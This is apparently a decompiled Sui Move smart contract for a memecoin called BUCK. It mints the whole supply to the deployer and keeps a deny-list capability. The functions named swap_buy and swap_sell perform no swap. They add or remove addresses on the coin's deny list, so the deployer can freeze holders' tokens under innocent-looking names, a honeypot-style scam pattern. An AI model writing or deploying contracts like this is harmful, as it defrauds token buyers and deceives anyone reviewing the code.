module 0xe657d34023cb145d4decdc23e07fa0ccf32615d3a7a3ad93b83eb8f9834e93ac::buck {
    struct BUCK has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BUCK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BUCK>(arg0, 9, b"BUCK", b"GME MASCOT", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmXL6KzEQH7uc2AUuyv9VdypPi9X38fb1E8AADLjZvkjAG"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BUCK>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BUCK>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BUCK>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BUCK>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BUCK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BUCK>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BUCK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BUCK>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

